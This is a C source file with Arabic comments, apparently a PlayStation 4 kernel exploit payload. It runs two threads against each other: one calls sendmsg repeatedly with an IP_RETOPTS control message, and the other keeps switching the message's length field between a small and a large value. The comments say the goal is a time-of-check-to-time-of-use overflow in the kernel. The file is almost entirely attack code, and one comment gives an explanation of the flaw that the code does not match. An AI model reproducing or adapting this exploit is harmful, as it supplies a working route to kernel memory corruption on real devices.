#include <ps4.h> // مكتبة SDK الخاصة بالـ PS4

#define ITERATIONS 100000
#define CONTROL_LEN 256

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int sock;

// الخيط الأول: يحاول استدعاء sendmsg باستمرار
void *sendmsg_thread(void *arg) {
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    for (int i = 0; i < ITERATIONS; i++) {
        // الثغرة تكمن في معالجة syscall 32-bit على نظام 64-bit
        // في FreeBSD/PS4 نستخدم sys_sendmsg
        syscall(28, sock, &msg, 0); 
    }
    return NULL;
}

// الخيط الثاني: يحاول تغيير الطول بسرعة لإحداث TOCTOU
void *race_thread(void *arg) {
    for (int i = 0; i < ITERATIONS; i++) {
        // نغير القيمة بين حجم صغير (يجتاز الفحص) وحجم كبير (يسبب Overflow)
        cmsg->cmsg_len = 0x50; 
        cmsg->cmsg_len = 0xFF; 
    }
    return NULL;
}

// الدالة الأساسية للـ Payload
int _main(struct thread *td) {
    initKernel(); // تعريف دوال النواة
    initLibc();   // تعريف مكتبة C الأساسية

    // 1. إنشاء Socket للعمل عليه
    sock = socket(AF_INET, SOCK_DGRAM, 0);

    // 2. تجهيز هيكل الـ Control Message
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = IPPROTO_IP;
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    // 3. إطلاق خيوط السباق
    ScePthread thread1, thread2;
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "sendmsg_race");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "modifier_race");

    // 4. الانتظار
    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    return 0;
}
